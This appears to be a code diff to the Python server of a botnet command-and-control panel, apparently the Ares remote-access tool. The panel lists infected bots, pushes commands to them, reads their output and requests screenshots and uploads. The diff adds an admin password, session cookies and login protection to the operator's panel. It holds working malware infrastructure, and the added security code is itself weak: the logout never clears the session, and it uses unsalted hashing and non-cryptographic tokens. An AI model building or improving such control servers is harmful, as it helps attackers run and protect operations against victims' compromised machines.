@@ -5,13 +5,20 @@ import os
 import re
 import random
 import string
+import hashlib
 
 
 UPLOAD_DIR = os.path.join(os.path.dirname(os.path.realpath(__file__)), "uploads")
 if not os.path.exists(UPLOAD_DIR):
     os.makedirs(UPLOAD_DIR)
-pending_uploads = []
+COOKIE_NAME = "ARESSESSID"
+SESSION_TIMEOUT = 300
 
+
+pending_uploads = []
+session_cookie = None
+last_session_activity = 0
+app = None
 
 html_escape_table = {
     "&": "&amp;",
@@ -48,16 +55,93 @@ def exec_DB(sql, params=()):
     conn.close()
 
 
+def get_admin_password():
+    result = query_DB("SELECT password FROM users WHERE name='admin'")
+    if result:
+        return result[0][0]
+    else:
+        return None
+
+
+def set_admin_password(admin_password):
+    password_hash = hashlib.sha256()
+    password_hash.update(admin_password)
+    exec_DB("DELETE FROM users WHERE name='admin'")
+    exec_DB("INSERT INTO users VALUES (?, ?, ?)", (None, "admin", password_hash.hexdigest()))
+
+
+def require_admin(func):
+        def wrapper(*args, **kwargs):
+            global session_cookie
+            global last_session_activity
+            global SESSION_TIMEOUT
+            if session_cookie and COOKIE_NAME in cherrypy.request.cookie and session_cookie == cherrypy.request.cookie[COOKIE_NAME].value:
+                if time.time() - last_session_activity > SESSION_TIMEOUT:
+                    return app.disconnect()
+                else:
+                    last_session_activity = time.time()
+                    return func(*args, **kwargs)
+            else:
+                raise cherrypy.HTTPRedirect("/login")
+        return wrapper
+
+
 class Main(object):
     @cherrypy.expose
+    @require_admin
     def index(self):
         with open("Menu.html", "r") as f:
             html = f.read()
             return html
 
+    @cherrypy.expose
+    def login(self, password=''):
+        admin_password = get_admin_password()
+        if not admin_password:
+            if password:
+                set_admin_password(password)
+                return 'Admin password set successfully. <a href="./login">Click here to login</a>'
+            else:
+                with open("CreatePassword.html", "r") as f:
+                    html = f.read()
+                    return html
+        else:
+            password_hash = hashlib.sha256()
+            password_hash.update(password)
+            if password_hash.hexdigest() == get_admin_password():
+                global session_cookie
+                session_cookie = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
+                cherrypy.response.cookie[COOKIE_NAME] = session_cookie
+                global last_session_activity
+                last_session_activity = time.time()
+                raise cherrypy.HTTPRedirect("/")
+            else:
+                with open("Login.html", "r") as f:
+                    html = f.read()
+                    return html
+
+    @cherrypy.expose
+    def disconnect(self):
+        session_cookie = None
+        cherrypy.response.cookie[COOKIE_NAME] = ''
+        cherrypy.response.cookie[COOKIE_NAME]['expires'] = 0
+        return 'You have been disconnected. <a href="./login">Click here to login</a>'
+
+    @cherrypy.expose
+    @require_admin
+    def passchange(self, password=''):
+        if password:
+                set_admin_password(password)
+                return 'Admin password changed successfully. <a href="./login">Click here to login</a>'
+        else:
+            with open("CreatePassword.html", "r") as f:
+                html = f.read()
+                return html
+
 
 class CNC(object):
     @cherrypy.expose
+    @require_admin
     def index(self):
         bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
         output = ""
@@ -70,6 +154,7 @@ class CNC(object):
             return html
 
     @cherrypy.expose
+    @require_admin
     def bot(self, botid):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
@@ -77,7 +162,7 @@ class CNC(object):
             html = f.read()
             html = html.replace("{{botid}}", botid)
             return html
-
+    
 
 class API(object):
     @cherrypy.expose
@@ -104,6 +189,7 @@ class API(object):
         exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))
 
     @cherrypy.expose
+    @require_admin
     def push(self, botid, cmd):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
@@ -114,11 +200,12 @@ class API(object):
             pending_uploads.append("screenshot")
 
     @cherrypy.expose
+    @require_admin
     def stdout(self, botid):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
         output = ""
-        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 10', (botid,))
+        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 30', (botid,))
         for entry in reversed(bot_output):
             output += "%s\n\n" % entry[2]
         bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
@@ -162,6 +249,7 @@ class API(object):
 
 
 def main():
+    global app
     config = {'global': {'server.socket_host': '127.0.0.1',
                 'server.socket_port': 8080,
                 'environment': 'production',
